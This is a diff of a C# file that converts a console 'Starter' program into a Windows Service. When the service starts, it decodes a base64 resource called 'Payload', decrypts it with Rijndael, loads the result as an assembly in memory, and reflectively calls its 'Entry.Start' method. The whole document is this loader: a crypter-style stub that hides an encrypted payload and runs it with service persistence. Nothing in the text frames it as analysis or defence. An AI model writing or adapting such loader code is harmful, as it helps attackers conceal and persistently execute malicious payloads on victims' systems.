@@ -1,15 +1,24 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
 using System.Linq;
+using System.Security.Cryptography;
+using System.ServiceProcess;
 using System.Text;
 using System.Threading.Tasks;
 using System.Reflection;
-using System.Security.Cryptography;
 
-namespace Starter
+namespace Service
 {
-    internal class Entry
+    public partial class Service : ServiceBase
     {
+        public Service()
+        {
+            InitializeComponent();
+        }
+
         private static RijndaelManaged encoder;
         private static void InitDecoder()
         {
@@ -35,29 +44,19 @@ namespace Starter
             return decryptedBytes;
         }
 
-        static void Main(string[] args)
+        protected override void OnStart(string[] args)
         {
-            Start();
-        }
-
-        public static void Start()
-        {
-#if DEBUG
-            Console.WriteLine("Running Decoder.");
-#endif
-
-
-
             InitDecoder();
             var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
             var asm = Decrypt(Convert.FromBase64String(b64));
 
-            var assembly = System.Reflection.Assembly.Load(asm);
+            var assembly = Assembly.Load(asm);
             var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
             method.Invoke(null, new object[] { });
+        }
 
-            //var assembly = System.Reflection.Assembly.Load(asm);
-            //assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
+        protected override void OnStop()
+        {
         }
     }
 }
